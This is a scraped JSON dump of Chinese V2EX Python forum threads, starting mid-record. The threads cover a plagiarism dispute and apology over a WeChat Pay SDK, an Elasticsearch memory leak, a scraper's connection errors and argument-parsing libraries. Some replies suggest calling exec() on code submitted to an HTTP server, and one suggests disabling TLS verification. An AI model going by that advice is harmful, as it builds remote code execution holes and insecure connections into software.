传入有误</li>\n</ol>\n<p>另外推荐下我的项目 <a href=\"https://github.com/zwczou/weixin-python\" rel=\"nofollow\">weixin-python</a>，包括微信支付,微信公众号,微信登陆,微信消息处理等</p>\n<p>已经在实际项目中使用过微信网页登陆，微信支付，微信公众平台大部分</p>\n<p>主要分为几个模块:</p>\n<ol>\n<li>微信登陆</li>\n<li>微信支付</li>\n<li>微信消息 ( 改自<a href=\"https://github.com/lepture/flask-weixin\" rel=\"nofollow\">lepture/flask-weixin</a> )</li>\n<li>微信公众平台</li>\n</ol>\n<p>以上几个模块都可以单独使用，也可以跟 flask 组合一起使用</p>\n</div></div>"], "reply": "42", "tittle": "关于 (开源我公司微信支付 python 版本的全部代码...) 项目的一些 bug", "comment": ["前排\r", "> （其实我是来看评论的）", "围观楼主吊打前文 CTO", "想要更多功能的可以看看 ", "围观楼主吊打前文 CTO +1", "Cool.", "坐等 CTO 出来澄清", "前排看戏", "原帖的 cto 已经 append 了...", "说你呢，对，别左顾右盼了，就是那个 20 岁的 CTO ，你向前一~步走！", "实际上 CTO 的博客也是直接抄的，然后归至自己的名下.\r", "虽然已经 502 了.", "刚我还在回帖说  zwczou 看到会尴尬...LOL", "so cool", "大师你好，请问这个可以把消息分享到朋友圈不？", "2333", "只好 @ Jolly23\r", "\r", ": doge", "做得好", "赞起来，围观 20 岁 CTO", "233", "围观。。。", "围观楼主吊打前文 CTO +1", "围观", "支持原作者", " 棒\r", "\r", "小建议,把 wiki 上的快速开始放到 Readme?", "围观", "star 了，估计很快就会用到。\r", "\r", "今年初还为了个项目，自已很痛苦的写了个 python 的微信支付。（再也不想去看微信的 API 文档了）\r", "\r", "我这个 33 岁做过好几次 CTO 的老司机，只能和这 20 岁 CTO 说：这种虚名没什么意思，做 CTO 也不是什么牛 X 的事。真没必要靠抄袭来爽，有这功夫好好学习，多写代码。另外请和原作者道歉。", "首先说一句抱歉，\r", "1. 不知道 zakzou 和你是不是一个人，刚开始写是参照 zakzou 的，并且也提过 contribute ，现在发现他的和你的代码一样。 ", "\r", "2. 刚发布那个帖子也没想到会有那么多的关注，虽然在 zakzou 代码上有改进，但大部分还是大部分使用了原来开源的代码，现在发现可能他的代码也是从您那 copy 的，所以我现在也是间接 copy 了您的代码，真的抱歉。\r", "3. 对我个人行为感到遗憾和后悔，发布没有好好考虑要提到原代码提供者版权问题，对不起。希望您能原谅，给我改过的机会。以后发布代码更加遵守版权问题。抱歉，致敬", "这就尴尬了。。", "很尴尬 我来列下人物清单\r", "\r", "主要当事人：\r", "\r", "- 楼主 [zwczou]( ", ") \r", "- 20 岁 CTO [Jolly23]( ", ")\r", "\r", "目前情况 20 岁 CTO Star > 楼主\r", "\r", "另外几个隐藏人物（有可能是楼主马甲，猜测，如果不是而且后续乱入的话故事会有新剧情。。。。）\r", "\r", "- 原始版 flask-weixin-pay [zakzou]( ", ")\r", "- 原始版 flask-weixin-pay 主要代码贡献 [zaczwc]( ", ")\r", "\r", "我只想说如果这些都是楼主马甲，请老司机你以后上路别挂这么多马甲啊，我找得都累。。。", "好像有点乱的样子", " 你这图像是谁啊？", " 南小鸟", "首先说一句抱歉 \r", "1. 解释下为什么贴的是另一个项目地址，并不是像 @", " 说的企图蒙混过关，开始开发是在几个月前，当时是从知乎上跳到 zakzou 那个 flask 微信支付项目中，当时直至昨天都不知道 zwczou 的代码和 zakzou 的代码一样，刚开始写是参照 zakzou 的，并且也提过 contribute ，现在发现他的和 zwczou 的代码一样， ", " \r", "2. 刚发布那个帖子也没想到会有这么多的关注，虽然在 zakzou 代码上有改进，把 zakzou 的工程脱离了 flask 框架限制并加了几个新的营销功能，但大部分还是大部分使用了原来开源的代码，现在发现可能他的代码也是从 zwczou 那 copy 的，所以我现在也是间接 copy 了 zwczou 的代码，真的抱歉。 \r", "3. 公司是我在大学时期创建的，法人不是我，聘请一些在读研究生做员工。 \r", "4. 对我个人行为感到遗憾和后悔，发布没有好好考虑到原代码提供者版权问题，对不起。希望大家能原谅，给我改过的机会。以后发布代码更加遵守版权问题。对不起。已在 github 补充了说明情况。 \r", "5. 向前辈致敬，同时也对前辈说一声对不起，对大家说声对不起。今后增强自己对于版权保护的认识，更加充分尊重原作者，抱歉。", " 多谢", " \r", " \r", "\r", "关于马甲的事情：\r", "所有马甲都带有 ZOU 或者 ZWC ，因为 ZWC 是本人的姓名拼音， ZOU 是姓拼音，而平时开发在公司有两台，家里面有台笔记本， gitconfig 有些出入导致马甲泛滥，给大家带来不便，不好意思！\r", "\r", "关于新开项目的事情：\r", "最开始有 zakzou/flask-weixin-pay ，因为我做的是微信里面的支付(pay.py)， JSAPI 需要有 openid ，而 openid 依赖于微信网页授权(login.py)，另外又经常用到 access token 做一些事情，所以导致想另起炉灶，做一个比较全的微信 SDK ，才有了 zwczou/weixin-python\r", "\r", "\r", " 接受你的道歉，事情就到这里吧！\r", "\r", "另：希望大家多多关注项目本身，多提交 issue 跟 pull requests ！", "  你 @我了, 那位说一下.\r", "\r", "1. 你参考的那个项目, 头文件里, 已经给出原作者(也就是本贴楼主) 的 gmail. 你聪明的话, 第一时间 google, 就能找到作者的 github, 以及 原始项目.\r", "\r", "2. 你对 参考的的项目的一处 contribute, 是什么呢. \r", "把原接口 json 返回值, 改成 flask 里的 jsonify() 实现. (画蛇添足哇)\r", "那么同学, 你有没有去看一下 flask 源码里 jsonify() 是如何实现的呢? 哈哈.\r", "为什么别人直接用 json() 返回? 你真以为别人不知道 jsonify()吗?\r", "可能原因: 不想跟 flask 框架绑死. 本来一个 lib, 最佳状况, 就是越少依赖越好.\r", "你这处改动, 出发点是好的. jsonify() 实现, 多做了些事情. \r", "但是, 数据的格式化, 处理, 原本就不是 lib 该考虑的, 应该由上层使用者, 再去包装数据. \r", "\r", "3. 我自己实现的 微信支付 SDK, 就不需要 flask. \r", "抽时间整理下代码, 会放出来, 另外还有 支付宝支付等 SDK, 欢迎 star.\r", "\r", "=================================\r", "\r", "我本意也不是想撕你一个学生, 只不过想提醒下, 学习态度要端正. \r", "不要太浮躁, 看别人的代码, 要仔细, 多琢磨一下为什么.\r", "看不懂别人写的代码是干嘛用的, 就随便删? 你可以提个 issue, 说不定作者心情好就告诉你一下.\r", "\r", "学习的心态不好, 浅尝辄止, 浮光掠影的. 不会有多大成就.\r", "\r", "每个人都是从菜鸟一步步成长起来的, github 有很多好代码. \r", "谦虚点, 多读读, 多琢磨琢磨.\r", "\r", "不要只是把活干完, 就完了. \r", "干好, 干的更好, 才有出息.", "纠正:\r", "第 2 条, 有偏差. (部分评论基于 lib 前提, 请无视)\r", "没细看, 原来是 example.py 代码. 改成 jsonify() 是可以的. \r", "如果是 lib 的 API 的返回值, 常规做法是返回正常的 Python 数据类型, 而不是 json, 更不需要引入 jsonify()", " 学习态度要端正. \r", "不要太浮躁, 看别人的代码, 要仔细, 多琢磨一下为什么. \r", "看不懂别人写的代码是干嘛用的, 就随便删? 你可以提个 issue, 说不定作者心情好就告诉你一下. \r", "\r", "学习的心态不好, 浅尝辄止, 浮光掠影的. 不会有多大成就. \r", "\r", "每个人都是从菜鸟一步步成长起来的, github 有很多好代码. \r", "谦虚点, 多读读, 多琢磨琢磨. \r", "\r", "不要只是把活干完, 就完了. \r", "干好, 干的更好, 才有出息.\r", "\r", "谢谢，通过这件事儿，我会重新思考自己的问题，把态度以及思想都摆正，谢谢您了。也谢谢您的忠告，永记于心", "本身微信支付就不是个很困难的问题，接口以及提供了，文档也有，按照要求接入，老司机最多两天就出来了，开不开源，问题都没什么问题，何况现在还用两家支付路由公司，做多种支付的聚合，所以这个事情就更简单了。最主要是和业务关联就好。\r", "\r", "\r", "哎，年轻人呀。总是希望搞个大新闻。", "老司机，马甲是多啊。 github 已 star ，学习学习。", "在用楼主那个 weixin-python 库，想说一句：老司机能在 install_requires 里把 flask 的依赖加上么。。。", " 怎么看出来前文的是 CTO ？？", " 前文楼主自己说的"]},
{"content": ["<div class=\"topic_content\">不是 eval,需要包含 context</div>"], "reply": "8", "tittle": "python 有没有办法,可以在代码中将一段字符串 load 进来作为代码的一部分执行", "comment": ["没看懂 如果是 python 代码，可以用`importlib`之类的方法动态加载吧。。", "试试 pickle", " importlib 我试用一下给你反馈, 我的需求就是 http server  接受提交的 code,然后执行后返回结果\r", "\r", " 这个是序列化工具吧?   并不能序列化代码", "exec ...", "exec", "为什么不 Google?", "保存到文件, 然后 再 ·python file.py· 就好啦。", "pypy?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>数据导入脚本如下</p>\n<pre><code>import time\nimport sys\nfrom elasticsearch import Elasticsearch\nfrom elasticsearch.helpers import bulk\n\nreload(sys)\nsys.setdefaultencoding('utf-8')\n\ndef set_mapping(es, index_name = \"content_engine\", doc_type_name = \"en\"):\n    my_mapping = {\n            \"en\": {\n                \"properties\": {\n                    \"a\": {\n                        \"type\": \"string\"\n                    },\n                    \"b\": {\n                        \"type\": \"string\"\n                    }\n                }\n            }\n    }\n    create_index = es.indices.create(index = index_name,body = my_mapping)\n    mapping_index = es.indices.put_mapping(index = index_name, doc_type = doc_type_name, body = my_mapping)\n    if create_index[\"acknowledged\"] != True or mapping_index[\"acknowledged\"] != True:\n        print \"Index creation failed...\"\n\ndef set_data(es, input_file, index_name = \"content_engine\", doc_type_name=\"en\"):\n    i = 0\n    count = 0\n    ACTIONS = []\n    for line in open(input_file):\n        fields = line.replace(\"\\r\\n\", \"\").replace(\"\\n\", \"\").split(\"----\")\n        if len(fields) == 2:\n            a, b = fields\n        else:\n            continue\n        action = {\n            \"_index\": index_name,\n            \"_type\": doc_type_name,\n            \"_source\": {\n                  \"a\": a,\n                  \"b\": b, \n            }\n        }\n        i += 1\n        ACTIONS.append(action)\n        if (i == 500000):\n            success, _ = bulk(es, ACTIONS, index = index_name, raise_on_error = True)\n            count += success\n            i = 0\n            ACTIONS = []\n\n    success, _ = bulk(es, ACTIONS, index = index_name, raise_on_error=True)\n    count += success\n    print(\"insert %s lines\" % count)\n\n\nif __name__ == '__main__':\n    es = Elasticsearch(hosts=[\"127.0.0.1:9200\"], timeout=5000)\n    set_mapping(es)\n    set_data(es,sys.argv[1])\n</code></pre>\n<p>数据大概 5 个 G 吧，机器配置虚拟机 24G 内存，刚开始无内存泄露现象，这个 Python 脚本的进程内存一直保持 1G 左右的占用，当插入 1600 ｗ，内存开始持续飙升，最后达到 22G ，导致触发 OOM 机制， Python 进程被内核 kill ，差点怀疑人生。。大家在遇到 Python 内存泄露都是怎么定位的？</p>\n</div></div>"], "reply": "18", "tittle": "Python 调用 elasticsearch 的 bulk 接口批量插入数据出现内存泄露，导致 OOM", "comment": ["1 、 gc \r", "2 、 objgraph", "5w bulk 一次，再不行重新建立下 es 对象试试", "没有人对你这么烂的代码感兴趣,这是事实,必须承认.\r", "\r", "试试,找个同事或者同学,然后口述你代码逻辑,也许你会自己发现问题~", " 你要是发现这代码哪里导致的内存泄露，就说出来，我承认我是渣渣没问题的。", " 其实我本意不是说你代码烂.\r", "\r", "内存泄露一般出现在循环里面向循环外的容器塞数据,导致内存泄露.\r", "\r", "你代码里的 ACTIONS 变量,在循环里面每次都塞一些数据,然后直到函数结束才释放.\r", "\r", "也就是说, ACTIONS 里面包含整个文件的数据?\r", "\r", "5G 的文件啊,哥.", "忽略上面的,代码没仔细看..", "如 2l 说的 减小 bulk 阀值,  直到没有内存问题", "参考这里： ", "\r", "1.试试用 generator 改写，\r", "2.因为 bulk 调用 streaming_bulk ，试试调整 chunk_size 、 max_chunk_bytes ： ", " 我试过减少 bluk 到 5w ，内存依然炸裂的\r", " 我是进程运行一段时间之后产生的内存泄露，有啥工具可以注入 Python 进程查看 gc 情况吗？\r", "\r", " 晚上回去试试。", "官网给的推荐是 1,000 to 5,000 条数据，文件大小是 5-15MB ， ", "有个思路是用 linux 的切割命令: split -l 5000 input_file\r", "再就是用多线程进行批量导入，线程数量最好是 200 个左右", "有个思路是用 linux 的切割命令: split -l 5000 input_file\r", "再就是用多线程对分割的文件 进行批量导入，线程数量最好是 200 个左右", "没用过 python es 的库，但是看你的代码，如果 es 存了 ACTIONS 这个 list 的引用，有可能有内存泄露。把 ACTIONS = []改成 del ACTIONS[:]试下？", " 嗯，我看了你的链接，官方的意思是推荐从一次导入 1000-5000 条开始测试直到找到最佳 performance 吧, 可能我的不是最佳，但是和这个应该没有关系,分割为小文件我导入我想过（现在我朋友推荐我使用 Java 的 API 用 9300 端口走 TCP 导入)，但是我其实想找到内存泄露的原因呢。\r", " 试过了，依然 oom ，我还试过 del 之后用 gc 库显示回收 gc ，也是炸裂。", "结帖了，在 github 提了[issue]( ", "虽然已结贴，但是我还想问下，如果把值调成 5000 ，会出现内存泄露不？因为看了下 github 上的生成器，给我的感觉是一次性导入数据，不知道我有没有看错，如果这样的话，效率会比较低吧。", "可以在内存飙升的时候看看具体是消耗在哪了。\r", "貌似有 guppy 之类的工具可用？", " 晚上我测试完了给你结果，我觉得还是会泄露， github 那个它说 bluk 内部有 chunking ，默认好像是 chunking size 是 5000 吧，理解为 5000 个 documents 请求一次 es 的 API 就行。\r", "\r", " 我取 stackoverflow 提问，有人推荐 pypi.python.org/pypi/memory_profiler  ，但是我这个情况还是不适用。"]},
{"content": ["<div class=\"topic_content\">最近想写一个爬虫 用来去 ehentai 爬本子玩\r<br>结果发现 requests.get 这个方法在爬 url 的时候会报错\r<br>\r<br>requests.exceptions.Connecti onError: ('Connection aborted.', ConnectionResetError(54, 'Connection reset by peer'))\r<br>\r<br>在网上查了一下 有人说是关于 OS X 自带的 openssl 版本太旧的关系\r<br>于是用 homebrew 去更新 openssl 结果在 link 的时候又爆出了错误\r<br>Linking keg-only openssl means you may end up linking against the insecure,\r<br>deprecated system OpenSSL while using the headers from Homebrew's openssl.\r<br>Instead, pass the full include/library paths to your compiler e.g.:\r<br>  -I/usr/local/opt/openssl/include -L/usr/local/opt/openssl/lib\r<br>\r<br>请问 1.requests 的问题跟 openssl 有关系么？\r<br>2.openssl 更新的问题怎么解决呀</div>", "<div class=\"topic_content\">![]( <img src=\"http://ww2.sinaimg.cn/large/006tNc79jw1fazripv40oj31kw0zk48u.jpg\" class=\"embedded_image\" border=\"0\"> )\r<br>终于成功了\r<br>还是翻墙的问题</div>"], "reply": "28", "tittle": "写了一个小爬虫 遇到了两个关于 requests 和 openssl 的问题", "comment": ["你要把报错的 URL 以及 Python requests 版本发出来。", "把 verify 这个参数设置为 false 试试", "如果只是想解决该问题，让爬虫正常工作，可以用 try catch 忽略这个错误，继续运行。", " 可是我要爬的就是这个页面啊\r", "如果忽略了的话 那就爬不下来东西了呀", " \r", "我以前的爬虫中出现过\r", "requests.exceptions.ConnectionError: ('Connection aborted.', error(104, 'Connection reset by peer'))\r", "但是出现时概率性的，并且概率很低，我就了循环和 try catch 忽略，然后就可以了", "爬虫抓 ssl 不同环境总会有多多少少的问题，一样的 py 环境， win2008 就出问题， win7 没问题，", " 可是你是 104 我是 54 诶", "问题是这跟 ssl 根本没关系啊", " 这就尴尬了", " ", "\r", "随便 ehentai 上拿了个本子（无声发车\r", "\r", "诺 就是爬不下来", " 要你出错的 URL ，没人有时间在那慢慢找。 How To Ask Questions The Smart Way ", " 这个就出错了", "你是不是没翻墙就爬了啊", " 你这个不是 HTTPS ，跟 SSL 无关", "像是被反爬虫 reset 了连接？", "如果不是 https 的话和 openssl 没关系，出现 'Connection reset by peer' 错误大部分情况下是爬虫没有伪装好或者请求太频繁被网站服务器拒绝访问了。", " 翻了呀\r", "终端也做了代理了", " \r", " \r", "UA cookie referee 全都做了 还是这么报错", " 我这边什么都没设直接就能 get 200 成功，不过我是在国外，所以可能是墙或代理的锅。", " 好吧 我尝试重新设置一下代理试试", "e 绅士是翻墙问题不是 openssl 问题", " 嗷嗷嗷懂了懂了\r", "那可能确实是我代理没做好", " \r", " \r", "设置了代理之后好了\r", "但是 还是有问题\r", "![]( ", " )", " \r", " \r", "好吧我发现了\r", "我 URL 改谷歌也爬不了\r", "可能还是代理的锅", " \r", " \r", "谢谢！\r", "我终于成功了", "有个粗暴的办法，先用浏览器打开你要的页面，然后 f12 看 request 的信息， chrome 有个选项可以把请求需要的所有东西拷贝成 curl 的格式，然后 curl 就可以了……", " 赞", " 简单粗暴啊！"]},
{"content": "", "reply": "7", "tittle": "python 除了 sys.argv 和 getopt 还有没有什么好用的 从命令行提取参数的库？", "comment": ["click ", "argparse\r", "docopt", "同推 click 。\r", "\r", "非常 awesome 的一个库。", "感谢以上三位 一会去试试\r", " \r", " \r", "同求，楼主能否整理一份文档。", "个人认为这个需求还是原生的写好，为了这一点点去引入一个库，感觉不值得", " click 有英文文档 相比其他库的英文文档非常简单\r", "而且也有好多人写了中文教程"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>GitHub 代码地址 [<a href=\"https://github.com/Jolly23/wx_pay_python\" rel=\"nofollow\">https://github.com/Jolly23/wx_pay_python</a>]</h1>\n<h1>作者个人网站 [<a href=\"https://jolly23.com\" rel=\"nofollow\">https://jolly23.com</a>]</h1>\n<h2>这套系统基本涵盖微信支付全部相关功能，以及自己总结的开发引导，如果可以请点 Star</h2>\n<h1>微信支付功能</h1>\n<p>参考文档 <a href=\"https://pay.weixin.qq.com/wiki/doc/api/jsapi.php\" rel=\"nofollow\">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php</a></p>\n<h2>使用</h2>\n<p>首先引入包</p>\n<pre><code>from wx_pay import WxPay, WxPayError\n</code></pre>\n<p>构造微信支付类，传入配置文件</p>\n<pre><code>wx_pay = WxPay(\n    wx_app_id='WX_APP_ID', \n    wx_mch_id='WX_MCH_ID', \n    wx_mch_key='WX_MCH_KEY',\n    wx_notify_url='http://www.example.com/pay/weixin/notify'\n)\n</code></pre>\n<p>创建订单</p>\n<pre><code>pay_data = wx_pay.js_api(\n        openid=u'***user_openid***',  # 付款用户 openid\n        body=u'***商品名称 /付款显示名称***',  # 例如：饭卡充值 100 元\n        total_fee=100  # total_fee 单位是 分， 100 = 1 元\n    )\n</code></pre>\n<p>给用户发红包</p>\n<pre><code>wx_pay.send_red_pack(\n    api_client_cert_path='/home/xxx/SERVER/ext_file/wx_2_pay_cert.pem',\n    api_client_key_path='/home/xxx/SERVER/ext_file/wx_2_pay_key.pem',\n    send_name=u'微信支付测试',  # 红包名称\n    re_openid=u'***to_user_openid***',  # 要接收红包的用户 openid\n    total_amount=100,  # total_fee 单位是 分， 100 = 1 元, 最大 499 元\n    wishing=u'感谢参与测试',  # 祝福语\n    client_ip=u'222.222.222.222',  # 调用微信发红包接口服务器公网 IP 地址\n    act_name=u'微信支付测试系统',  # 活动名称\n    remark=u'感谢参与'  # 备注\n)\n</code></pre>\n<p>查询订单</p>\n<pre><code>raw = wx_pay.close_order(out_trade_no)\n</code></pre>\n<p>关闭订单</p>\n<pre><code>raw = wx_pay.order_query(out_trade_no=out_trade_no)\n</code></pre>\n<h2>工具函数</h2>\n<p>签名</p>\n<pre><code>wx_pay.sign(dict(openid=\"123\"))\n</code></pre>\n<p>32 位随机字符串</p>\n<pre><code>wx_pay.nonce_str()\n</code></pre>\n<p>验证签名</p>\n<pre><code>wx_pay.check(dict(openid=\"123\", sign=\"SIGN\"))\n</code></pre>\n<p>生成微信前端 JS 参数</p>\n<p>详见example.py的wx_js_config方法，用来生成前端使用微信js的必要参数</p>\n</div></div>", "<div class=\"topic_content\">前期开发参照 <a target=\"_blank\" href=\"https://github.com/zakzou/flask-weixin-pay/blob/master/example.py\" rel=\"nofollow\">https://github.com/zakzou/flask-weixin-pay/blob/master/example.py</a> ，后来在这个基础上改进了很多地方，包括不限制是 flask 框架，以及加入微信支付的新功能发送红包和企业付款。\r<br>感谢前辈</div>", "<div class=\"topic_content\">微信支付功能集，前期开发借鉴 <a target=\"_blank\" href=\"https://github.com/zakzou/flask-weixin-pay\" rel=\"nofollow\">https://github.com/zakzou/flask-weixin-pay</a> ，抱歉不是在 fork 上改动是因为几个月前就开始带到项目中使用，改进包括让其脱离 flask 框架限制，并且加入微信支付最新的两个营销功能，然后从我的工程代码提出来这个底层类发布。向前辈致谢</div>", "<div class=\"topic_content\">首先说一句抱歉\r<br>1. 解释下为什么贴的是另一个项目地址，并不是像 @<a target=\"_blank\" href=\"/member/hhstore\">hhstore</a> 说的企图蒙混过关，开始开发是在几个月前，当时是从知乎上跳到 zakzou 那个 flask 微信支付项目中，当时直至昨天都不知道 zwczou 的代码和 zakzou 的代码一样，刚开始写是参照 zakzou 的，并且也提过 contribute ，现在发现他的和 zwczou 的代码一样， <a target=\"_blank\" href=\"https://github.com/zakzou/flask-weixin-pay\" rel=\"nofollow\">https://github.com/zakzou/flask-weixin-pay</a> \r<br>2. 刚发布那个帖子也没想到会有这么多的关注，虽然在 zakzou 代码上有改进，把 zakzou 的工程脱离了 flask 框架限制并加了几个新的营销功能，但大部分还是大部分使用了原来开源的代码，现在发现可能他的代码也是从 zwczou 那 copy 的，所以我现在也是间接 copy 了 zwczou 的代码，真的抱歉。\r<br>3. 公司是我在大学时期创建的，法人不是我，聘请一些在读研究生做员工。\r<br>4. 对我个人行为感到遗憾和后悔，发布没有好好考虑到原代码提供者版权问题，对不起。希望大家能原谅，给我改过的机会。以后发布代码更加遵守版权问题。对不起。已在 github 补充了说明情况。\r<br>5. 向前辈致敬，同时也对前辈说一声对不起，对大家说声对不起。今后增强自己对于版权保护的认识，更加充分尊重原作者，抱歉。</div>"], "reply": "93", "tittle": "开源我公司微信支付 python 版本的全部代码，包含生成微信订单，以及最新的微信平台向用户发红包，向用户付款等功能", "comment": ["先赞一下！", "滋瓷\r", "v2 应该多一些这种帖子，少一些撕逼的", "先赞后看！", "你们公司同意你开源？", "手动点赞", " CTO 说了算，也就是我说了算， that's enough", "放出来的代码足够大家开发用，一些涉密的小东西没开源，但不影响此框架使用。截至昨天，我公司用这套代码 3 个月已经在微信成功过账 109 万元且未产生任何问题。", "赞一个", " 你这泄露了财务信息吧 - -b", "支持开源", "先赞后看", "你问我呲磁不呲磁，我当然是呲磁的！我们年轻人还是要 Star 学习一个。", " 我 20 周岁，也是年轻人 哈哈", "哇，才大三就 CTO 啦", " 我遭不住这种 20 多岁就当上 CTO 的了 ", "   ", "   ", "  反观自己还在打杂…", " 也许我这含金量不大呗 毕竟公司目前业务单一", "你们公司同意你开源？", "先赞后看，楼主加油", "不错的哦。 很详细~", "学习了，感谢分享哈", "赞一个，微信 API 之接的恶心好久，各种 XML ，稀奇古怪的接口请求，感觉糅合了十几号人的风格。\r", "虽然愿景很好，但这样的项目其实不太敢用的，因为即使用这个项目，还要全面的去看你的代码和微信接口，一但微信方面接口升级，不知道你那边什么时候升级，难道不支付了？\r", "有空去看你代码的，还不如自己封装一遍。。。", "该 star 的还是得 star 啊。\r", "这个东西都是 API 各种回调，核心自然在微信那边，核心支付的东西微信在出 API 的时候已经做了各种防范了。只要 API 用的好，基本上在支付上不会问题，就是回调错了，微信那边也会给你 pass 掉。基本上没有啥安全性问题，不过还是 star 啊！", "\"劳资叫你们维护系统，你们居然给开源了\"", "python2 ...", "点赞", "这个是要赞一个。", "查询订单\r", "\r", "raw = wx_pay.close_order(out_trade_no)\r", "关闭订单\r", "\r", "raw = wx_pay.order_query(out_trade_no=out_trade_no)\r", "\r", "这边写反了哦…", "666", " 感谢指正，粗心了", "我记得发红包每个用户至少 1 元吧 ... 这个没判断算不算 BUG ？ O(∩_∩)O 哈哈~", "2333333 ，可以用来轻度套现", "哇塞，请问有现成的网站或微信号可以参考一下吗？\r", "虽然……用不到。\r", "但估计以后会有用，所以希望能提供一下简单的参考或微信号。", " 民大小偲-个人中心-赞助（但是没绑定学号看不到赞助页面） 校园卡充值也看不到", "你是个伟人", "我觉得要尊重下\r", "我觉得要尊重下 \r", "我也觉得要尊重下\r", "楼上这啥情况，要撕逼啊，瓜子小板凳已备好", "谢谢", "合着直接抄的啊…", "这 TM 就很尴尬了", "马克,感谢分享", "字词，感谢分享", "这。。。果然亮点都在评论", "分分钟扒掉底裤.....", "后排了", "你知道你为什么不能叫 wxpay 吗？\r", "因为 wxpay 被我占了。哈哈哈。", "还有，这个退款操作的 API 不可以的吧。。确定能正常？文档里写着要求要用证书的。。 ", "最开始 zakzou/flask-weixin-pay 有以下几个问题：\r", "1. 下载账单返回的不是 xml ，而是 csv 格式的，所以此接口不能使用（ download_bill)\r", "2. 退款需要商户证书，目前还不支持，还在开发中(refund)\r", "\r", "在 weixin-python 里面已经修复问题 1 ，问题 2 也在支持的路上\r", "\r", "\r", "另外 zakzou/flask-weixin-pay 是支持非 flask 的框架的，你的这个版本反而仅仅支持 flask 框架了", "你的个人网站 502 了。。。。。", "我去，看到评论好方", "好尴尬，这个 star 比 zwczou 的都多", "昨天也看见了锤子开源的 onestep ，每次在 Github 上看见中文的文档和 readme ，都觉得好接地气，莫名的亲切。", "看见标题就赞了", "要回复先看看上面的评论吧", "表示看见过 N 次，个人网站放上来，几小时后挂了\r", "(ಡωಡ)", "开源也要遵守基本法吼", "搭车，自己写的微信公众号和微信支付 sdk ， ", " ，实际使用过，\r", "与框架无关，代码很简单，看看就懂了", "这个要赞一下～ 呵呵。 Mark 一记", "呵呵，楼主能解释下 35-37 楼的质疑，和 40 楼的抄袭问题吗\r", "\r", "呵呵，楼主能解释下 35-37 楼的质疑，和 40 楼的抄袭问题吗\r", "\r", "呵呵，楼主能解释下 35-37 楼的质疑，和 40 楼的抄袭问题吗", "关于支付，目前采用 ping++的方案是个不错的选择，而且有商业的团队来保障质量。这个项目开源，是个学习的好东西。", "502 Bad Gateway\r", "\r", "nginx/1.10.0 (Ubuntu)\r", "分分钟。。。", "star 了，另 ", "  502 了", "我也觉得要尊重下 \r", " ", " 没错，我们也是这样。。。 pingxx 和 beecloud", "马克一下 可能以后用的着", "楼主，我喜欢你", "先赞一个再慢慢看", "这特么就很尴尬了", "我只是来看戏的", "所以... 我 star 了 ", "比较了下代码， 20 岁 CTO ，抱歉的通知您，赞我要收回了。。", "这好尴尬...", "题主做人态度不端正啊. 我仔细对比了 2 个项目的代码, 合着你是原版照抄啊!?\r", "你倒是改个函数名, 意思一下啊!?\r", "\r", "==============================\r", "\r", "1. 照着别人的项目, 完整照抄, 还出来骗赞, 这个动机就很可耻.\r", "2. v 友给出`被抄袭人`的项目, 打脸了, 扭扭捏捏, 贴了原作者另外一个项目, 企图蒙混过关. 你抄的哪个, 你觉得大家瞎吗?\r", "这个做法简直是不要脸了.\r", "3. 抄代码的时候, 你看懂别人的代码了吗? 原作者肯定是 Python 老司机, 代码追求 1 行流, 恐怕你看不懂, 不知道怎么改吧? 这就尴尬了. \r", "4. 你删了 原作者 部分代码, 你知道 `你删除那部分的代码` 用意是什么吗? \r", "5. 学习, 借鉴, 分享, 都不可耻. 前提是首先尊重他人成果. 借鉴他人的成果, 要注明.\r", "6. 点进你的个人简介, 看是 20 岁的学生, Python 代码 1 行流, 写的这么溜. 显然 Python 基础不错啊, 这是个好苗子, 可惜被打脸了哇. 你这种不端正的学习态度, 如果不纠正, 会误你一生的.\r", "7. 这位同学, 念你还没毕业, 好好反思一下吧. 以后进了社会, 没人给你犯错的机会. 你每一次试错, 都要付出巨大的代价.\r", "\r", "\r", "==============================\r", "\r", "路过同学, 可以仔细对比一下 原作者的代码, 和 这位 抄袭者的. 高下立判.\r", "\r", "原作者:\r", "\r", "\r", "该抄袭同学:\r", "\r", "\r", "企图蒙混的示例:\r", "刚要赞，好尴尬。。", "注释都要照抄，这好尴尬，我赶紧 unstar 了...", "微信支付功能集，前期开发借鉴 ", " ，抱歉不是在 fork 上改动是因为几个月前就开始带到项目中使用，改进包括让其脱离 flask 框架限制，并且加入微信支付最新的两个营销功能，然后从我的工程代码提出来这个底层类发布。向前辈致谢", "收回我的 star", "  这个是原作者吗?  2333.\r", "\r", "小吐槽下: \r", "代码风格, 过于追求 Python 代码 1 行流, 不利于团队带新手.\r", "另外, 代码还是写的挺优雅.老司机开车, 稳!\r", "\r", "========================\r", "\r", "围观群众应该去 star 原作者哇.", " 感谢指正，但贴那个地址并不是企图蒙混过关，是真的开始就看的那个代码啊，上面有我的 contribure", " 别洗了，大大方方承认，把 repo 删了重新做人。", "这就很尴尬了 大兄弟", "开撕开撕", "这里我也来列下人物清单 \r", "\r", "主要当事人： \r", "\r", "- 楼主 [zwczou]( ", ") \r", "- 20 岁 CTO [Jolly23]( ", ") \r", "\r", "目前情况 20 岁 CTO Star > 楼主 \r", "\r", "另外几个隐藏人物（有可能是楼主马甲，猜测，如果不是而且后续乱入的话故事会有新剧情。。。。） \r", "\r", "- 原始版 flask-weixin-pay [zakzou]( ", ") \r", "- 原始版 flask-weixin-pay 主要代码贡献 [zaczwc]( ", ") \r", "\r", "我只想说如果这些都是楼主马甲，请老司机你以后上路别挂这么多马甲啊，我找得都累。。。", "首先说一句抱歉\r", "1. 解释下为什么贴的是另一个项目地址，并不是像 @", " 说的企图蒙混过关，开始开发是在几个月前，当时是从知乎上跳到 zakzou 那个 flask 微信支付项目中，当时直至昨天都不知道 zwczou 的代码和 zakzou 的代码一样，刚开始写是参照 zakzou 的，并且也提过 contribute ，现在发现他的和 zwczou 的代码一样， ", " \r", "2. 刚发布那个帖子也没想到会有这么多的关注，虽然在 zakzou 代码上有改进，把 zakzou 的工程脱离了 flask 框架限制并加了几个新的营销功能，但大部分还是大部分使用了原来开源的代码，现在发现可能他的代码也是从 zwczou 那 copy 的，所以我现在也是间接 copy 了 zwczou 的代码，真的抱歉。\r", "3. 公司是我在大学时期创建的，法人不是我，聘请一些在读研究生做员工。\r", "4. 